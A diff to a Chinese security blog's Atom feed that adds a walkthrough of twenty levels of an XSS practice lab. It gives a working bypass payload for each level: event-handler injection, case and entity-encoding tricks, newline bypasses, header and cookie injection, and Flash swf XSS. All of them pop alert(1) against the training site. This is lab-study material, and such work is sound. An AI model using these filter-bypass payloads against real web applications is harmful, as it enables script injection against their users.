@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sunu11.com/"/>
-  <updated>2019-01-29T07:07:02.233Z</updated>
+  <updated>2019-01-25T08:09:17.904Z</updated>
   <id>http://sunu11.com/</id>
   
   <author>
@@ -15,28 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>test</title>
-    <link href="http://sunu11.com/2019/01/29/99/"/>
-    <id>http://sunu11.com/2019/01/29/99/</id>
-    <published>2019-01-29T07:06:22.000Z</published>
-    <updated>2019-01-29T07:07:02.233Z</updated>
-    
-    <content type="html"><![CDATA[<p>222222</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;222222&lt;/p&gt;
-
-      
-    
-    </summary>
-    
-    
-  </entry>
   
   <entry>
     <title>命令执行的一些总结与tips</title>
@@ -488,6 +466,30 @@
     <summary type="html">
     
       &lt;h3 id=&quot;心得&quot;&gt;&lt;a href=&quot;#心得&quot; class=&quot;headerlink&quot; title=&quot;心得&quot;&gt;&lt;/a&gt;心得&lt;/h3&gt;&lt;p&gt;接着上一文过来，这一部分是个人的一些总结。对于挖掘xss漏洞，目的都是让自己的payload可以执行，在其探索的过程中，我个人首先会通过审查元素，了解其输入点，过滤规则，然后
+    
+    </summary>
+    
+      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
+    
+      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>我与XSS的感情之路(2)</title>
+    <link href="http://sunu11.com/2017/07/23/13/"/>
+    <id>http://sunu11.com/2017/07/23/13/</id>
+    <published>2017-07-23T03:43:55.000Z</published>
+    <updated>2018-11-03T11:56:48.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>接着上一文过来，这一部分是第二个环境的做题记录。<a id="more"></a></p><h2 id="平台2-xsqler-win"><a href="#平台2-xsqler-win" class="headerlink" title="平台2 xsqler.win"></a>平台2 <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvaW5kZXgucGhw" title="http://sqler.win/xss/index.php">xsqler.win<i class="fa fa-external-link"></i></span></h2><p><strong><em>Stage#1: <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxLnBocD9uYW1lPXRlc3Q=" title="http://sqler.win/xss/level1.php?name=test">http://sqler.win/xss/level1.php?name=test<i class="fa fa-external-link"></i></span></em></strong><br>本关简单，使用svg\body\style \ iframe等标签均可过关。<br>payload: <code>http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#2: <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwyLnBocD9rZXl3b3JkPXRlc3Q=" title="http://sqler.win/xss/level2.php?keyword=test">http://sqler.win/xss/level2.php?keyword=test<i class="fa fa-external-link"></i></span></em></strong><br>本题与第一题差不多，只需要进行标签的闭合即可。<br>payload:<br><code>http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#3：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwzLnBocD93cml0aW5nPXdhaXQ=" title="http://sqler.win/xss/level3.php?writing=wait">http://sqler.win/xss/level3.php?writing=wait<i class="fa fa-external-link"></i></span></em></strong><br>本题通过测试，可得知过滤了&lt;&gt;，且只能用’闭合标签。于是采用on事件型如onmouseover、onmouseout、onclick等进行绕过。Payload: <code>&#39;onmouseover=&#39;alert(1)</code></p><p><strong><em>Stage#4: <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWw0LnBocD9rZXl3b3JkPQ==" title="http://sqler.win/xss/level4.php?keyword=">http://sqler.win/xss/level4.php?keyword=<i class="fa fa-external-link"></i></span></em></strong><br>本题与上题类似，使用”闭合标签即可：payload：<code>&quot;onmouseover=&#39;alert(1)’</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-13.png" alt="图13"></p><p><strong><em>Stage#5: <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWw1LnBocD9rZXl3b3JkPWZpbmQ=" title="http://sqler.win/xss/level5.php?keyword=find">http://sqler.win/xss/level5.php?keyword=find<i class="fa fa-external-link"></i></span> a way out! </em></strong><br>本题比较简单，增加了过滤范围，on-&gt;o_n 然后需要闭合。可以使用<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code>通过点击出现的链接进行通关。</p><p><strong><em>Stage#6: <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWw2LnBocD9rZXl3b3JkPWJyZWFr" title="http://sqler.win/xss/level6.php?keyword=break">http://sqler.win/xss/level6.php?keyword=break<i class="fa fa-external-link"></i></span> it out! </em></strong><br>随便哪一个试一下，处理掉了src、herf、onxxx、等，需要进行绕过，通过大小写，成功绕过payload：<code>&quot;&gt;&lt;a HRef=javascript:alert(1)&gt;</code></p><p><strong><em>Stage#7: <span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWw3LnBocD9rZXl3b3JkPW1vdmU=" title="http://sqler.win/xss/level7.php?keyword=move">http://sqler.win/xss/level7.php?keyword=move<i class="fa fa-external-link"></i></span> up! </em></strong><br>本题对输入的script、on等进行了单层过滤，可以使用其过滤不严，采用此类payload绕过即可：<code>&lt;svg/oonnload=alert(1)&gt;、或者将script写成scrscriptipt</code>的方式构造即可。</p><p><strong><em>Stage#8:<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWw3LnBocD9rZXl3b3JkPW1vdmU=" title="http://sqler.win/xss/level7.php?keyword=move">http://sqler.win/xss/level7.php?keyword=move<i class="fa fa-external-link"></i></span> up! </em></strong><br>本题已经给出了一个<a>标签,但是过滤了script、src等，大小写无法绕过，但是可以使用html编码进行绕过payload：<code>javasc&amp;#114;ipt:alert(1)</code></a></p><p><strong><em>Stage#9：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWw5LnBocD9rZXl3b3JkPW5vdA==" title="http://sqler.win/xss/level9.php?keyword=not">http://sqler.win/xss/level9.php?keyword=not<i class="fa fa-external-link"></i></span> bad! </em></strong><br>本题最大的难点在于绕合法连接，发现只有带<code>http://</code>的url才能被认为是合法链接，另外由于“”也被过滤，其他规则与上一关相同，因此需要进行编码。于是构造payload： <code>javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;)</code></p><p><strong><em>Stage#10：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxMC5waHA/a2V5d29yZD13ZWxs" title="http://sqler.win/xss/level10.php?keyword=well">http://sqler.win/xss/level10.php?keyword=well<i class="fa fa-external-link"></i></span> done! </em></strong><br>本题存在三个隐藏输入框，构造如下get请求，查看元素后，发现t_sort能被写入，如图：<br>get请求：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxMC5waHA/dF9saW5rPTExMSZhbXA7dF9oaXN0b3J5PTIyMiZhbXA7dF9zb3J0PTMzMw==" title="http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333">http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333<i class="fa fa-external-link"></i></span></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-14.png" alt="图14"></p><p>因此只需要在该参数处构造跨站脚本语句即可，使用<code>&quot;onmouseover=&#39;alert(1)&#39;</code>然后让输入框属性显示出来改hidden为text即可：payload如下：<br><code>http://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#11：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxMS5waHA/a2V5d29yZD1nb29k" title="http://sqler.win/xss/level11.php?keyword=good">http://sqler.win/xss/level11.php?keyword=good<i class="fa fa-external-link"></i></span> job! </em></strong><br>通过查看元素，发现t_ref的value是我们这个网页的referer值，抓包修改referer输入xss payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code>即可，本题不想多说什么，感觉referer一般存在xss的极少。</p><p><strong><em>Stage#12：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxMi5waHA/a2V5d29yZD1nb29k" title="http://sqler.win/xss/level12.php?keyword=good">http://sqler.win/xss/level12.php?keyword=good<i class="fa fa-external-link"></i></span> job! </em></strong><br>查看元素可看到t_ua参数的value是User-Agent值，和上一题一样，修改为xss payload即可：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#13：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxMy5waHA/a2V5d29yZD1nb29k" title="http://sqler.win/xss/level13.php?keyword=good">http://sqler.win/xss/level13.php?keyword=good<i class="fa fa-external-link"></i></span> job! </em></strong><br>此题思路同上，这次传参位置为cookie，payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;；</code>感觉这三题是绕脑洞的样子，，，但是在测试过程中还真没发现过，，，，</p><p><strong><em>Stage#14：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxNC5waHA=" title="http://sqler.win/xss/level14.php">http://sqler.win/xss/level14.php<i class="fa fa-external-link"></i></span></em></strong><br>本题可以在查看元素发现嵌入了一个iframe页面，访问该页面是查看图片EXIF信息的，通过看答案知道有EXIF在解析过程中，某些插件在解析时输出未处理可导致xss漏洞，因此食用exiftool工具，修改图片EXIF后，进行上传，然后解析过程中弹窗。学习了，，，， </p><p><strong><em>Stage#15：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3NjaGFsbGVuZ2UvbGV2ZWwxNS5waHA/c3JjPTEuanBn" title="http://sqler.win/xsschallenge/level15.php?src=1.jpg">http://sqler.win/xsschallenge/level15.php?src=1.jpg<i class="fa fa-external-link"></i></span></em></strong><br>本关说是利用src可包含前面页面上的xss漏洞，然后进行弹窗，怎么尝试都没弹出来，，，表示无奈。。。。。</p><p><strong><em>Stage#16：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxNi5waHA/a2V5d29yZD0=" title="http://sqler.win/xss/level16.php?keyword=">http://sqler.win/xss/level16.php?keyword=<i class="fa fa-external-link"></i></span></em></strong><br>本题终于回到常规绕的思路上了，，经过尝试，可以判断过滤了空格，/等符号，然后尝试绕过，很多姿势都不行，包括编码，进制，截断等然后发现换行符可以绕过：%0a、%0d，因此，payload：<br><code>http://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt;</code></p><p><strong><em>Stage#17：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxNy5waHA/YXJnMDE9YSZhbXA7YXJnMDI9Yg==" title="http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b">http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b<i class="fa fa-external-link"></i></span></em></strong><br>本题比较简单，在arg02参数值中写入事件型payload即可触发，payload:<br><code>http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1)</code></p><p><strong><em>Stage#18：ttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=b</em></strong><br>本题与上一题相似，但是arg02无法构造出空格，也就没办法写入输出语句，然后试了试arg01，果然换汤不换药，直接写入payload：<code>%20onmousedown=alert(1)</code></p><p><strong><em>Stage#19：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwxOS5waHA/YXJnMDE9YSZhbXA7YXJyZzAyPWI=" title="http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b">http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b<i class="fa fa-external-link"></i></span></em></strong><br>右键查看元素可以看到一个swf文件被调用，然后设想为flash xss，通过下载该文件，使用JPEXS进行分析，发现为actionscript 2.0，然后知道actionscript 2.0是有可以使用getURL来执行javascript下面以一个实例来剖析Flash XSS过程。有点拗口，，,然后对应本题，定位geturl函数：</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-15.png" alt="图15"><br>可以看到在sIFR的内容中当getURL打开时，version是可以传入到loc4中的，因此定位contentIsLink函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function contentIsLink()</span><br><span class="line">  &#123;</span><br><span class="line">     return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>然后可以根据contentIsLink函数构造出payload:<br><code>http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E</code></p><p><strong><em>Stage#20：<span class="exturl" data-url="aHR0cDovL3NxbGVyLndpbi94c3MvbGV2ZWwyMC5waHA/YXJnMDE9YSZhbXA7YXJnMDI9Yg==" title="http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b">http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b<i class="fa fa-external-link"></i></span></em></strong><br>本题个人感觉比上一题容易做出来，，下载swf文件使用JPEXS进行分析后可以发现是zeroclipboard.swf，然后百度一发，<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9zZWN0b29sLzEwODU2OC5odG1s" title="http://www.freebuf.com/sectool/108568.html">freebuf<i class="fa fa-external-link"></i></span>第一个，粘贴即可payload：<br><code>http://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-16.png" alt="图16"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;接着上一文过来，这一部分是第二个环境的做题记录。
     
     </summary>
     
